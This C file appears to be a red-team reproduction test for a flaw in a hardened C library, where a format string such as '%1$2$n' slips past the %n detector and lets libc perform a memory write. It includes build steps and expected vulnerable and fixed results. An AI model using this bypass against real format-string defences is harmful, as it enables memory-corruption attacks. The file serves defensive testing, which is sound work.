/*
 * FINDING F1 -- %n detector bypass via repeated positional specifiers.
 *
 * Contract (stdlib/safe/safe_format.h): "%n (including length-modified forms)
 * is refused in all format and scan functions."
 *
 * cplus_fmt_has_percent_n() consumes the first "N$" as a positional index,
 * then the second "M$" as ordinary width digits, and finally advances one byte
 * past the '$' -- landing *after* the 'n'. It never sees a '%n' conversion.
 * libc, however, parses the whole "%1$2$n" as a genuine %n write.
 *
 * Build + run (from repo root):
 *   /usr/bin/clang -std=c99 -O1 -g -Istdlib/safe -Ilibc/install-include \
 *     -Ithird_party/safeclib/include \
 *     tests/redteam/format_io/repro_f1_pctn_bypass.c \
 *     build/safe/libcplus_safecrt.a build/libc/libcplus_hardened.a \
 *     -lm -pthread -o /tmp/repro_f1 && /tmp/repro_f1
 *
 * Expected (vulnerable): rc >= 0, errno unchanged, sink changed to 4.
 * Expected (fixed):      rc == -1, errno == EINVAL, sink unchanged.
 */
#include <stdio.h>
#include <errno.h>
#include "safe_format.h"
#include "safe_runtime.h"

int main(void) {
    volatile int sink = 0x24681357;
    char fmt[32];
    /* Assembled at runtime so the C+ compile-time format check cannot help. */
    snprintf(fmt, sizeof fmt, "%s%s", "ABCD", "%1$2$n");
    cplus_runtime_set_violation_trap(0); /* turn refusals into -1/EINVAL */
    errno = 0;
    int rc = cplus_printf_s(fmt, (int *)&sink, (int *)&sink);
    printf("rc=%d errno=%d sink=0x%08x (0x24681357 == no write)\n",
           rc, errno, (unsigned)sink);
    return 0;
}
